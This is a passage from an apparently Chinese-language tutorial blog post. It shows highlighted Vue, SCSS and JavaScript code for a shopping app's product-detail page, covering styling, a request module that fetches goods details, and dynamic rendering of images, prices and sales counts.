</span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">rgba</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">0.1</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.desc</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">scroll</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">!important</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.info</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.now</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.oldprice</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#959595</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-decoration</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">line-through</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.sellcount</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#959595</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">4px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.msg</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">24px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.service</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fafafa</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.left-words</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">span</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.van-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">4px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.comment</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.comment-title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#959595</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.comment-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">16px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.top</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.name</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.time</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#999</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.footer</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">55px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#ccc</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-evenly</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.icon-home</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.icon-cart</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.van-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">24px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.btn-add</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.btn-buy</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">36px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">120px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">18px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ffa900</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.btn-buy</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fe5630</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.tips</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>封装获取商品详情的请求模块 <code>api/goodsDetail.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/request"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 获取商品详情</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsDetail</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">request</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">get</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"/goods/detail"</span><span style="color: #D4D4D4">, {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">params:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span></code></pre></div></div></figure><p>获取的一个示例：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408301539204.png" alt="image-20240830153951035"></p><p>于是进行动态渲染</p><h3 id="商品说明动态渲染"><a class="markdownIt-Anchor" href="#商品说明动态渲染"></a> 商品说明动态渲染</h3><p>改造 template 中对图片的渲染：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">image</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;img :src="image.external_url" /&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-swipe-item</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>script 部分如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">import </span><span style="color: #569CD6">{</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">getGoodsDetail</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">}</span><span style="color: #D4D4D4"> from '@/api/goodsDetail'</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">export default </span><span style="color: #569CD6">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">'ProDetail'</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">detailId</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">params</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">id</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    const </span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span></span><span class="line"><span style="color: #D4D4D4">    const </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsDetail</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(res)</span></span><span class="line"><span style="color: #D4D4D4">    this.</span><span style="color: #9CDCFE">goodsObj</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.goodsObj)</span></span><span class="line"><span style="color: #D4D4D4">    this.</span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_images</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    return {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">goodsObj</span><span style="color: #D4D4D4">: {},</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">images</span><span style="color: #D4D4D4">: [],</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C8C8C8">current</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onChange</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">current</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">index</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #569CD6">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>修改商品说明进行动态渲染：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">&lt;!-- 商品说明 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      &lt;div class="title"&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;div class="price"&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span class="now"&gt;￥{{ goodsObj.goods_price_min }}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">          &lt;span class="oldprice"&gt;￥{{ goodsObj.goods_price_max }}&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"sellcount"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">已售{{ goodsObj.goods_sales }}件</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #D4D4D4">/</span><span 